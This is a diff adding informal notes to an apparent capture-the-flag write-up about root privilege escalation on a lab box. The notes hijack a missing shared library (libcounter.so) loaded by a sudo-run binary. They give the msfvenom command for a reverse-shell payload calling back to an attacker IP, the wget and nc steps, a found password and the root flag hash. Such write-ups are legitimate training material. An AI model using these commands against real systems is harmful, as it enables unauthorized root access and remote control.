@@ -89,5 +89,21 @@ sudo -l:
 using strings /usr/bin/stock i got a password
     St0ckM4nager
 
+using strace to see what happends if i run the /usr/bin/stock
+
+    openat(AT_FDCWD, "/home/rektsu/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+
+so it means that tries to open file libcounter.so
+
+i do msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.120 LPORT=8081 -f elf-so -o libcounter.so to create reverse shell once again with port 8081
+
+its very important to do pyton3 -c 'import pty;pty.spawn("/bin/bash")' to upgrade the shell,without it its not gonna work
+
+so next is cd /home/rektsu/.config/ and wget /libcounter.so to this directory
+
+after it we open new nc with port 8081 and run the binary again, and we get the reverse shell on root
+
+cd /root and root flag:
+    044126c8aa104d17dfae7860ec5936f7
 
 
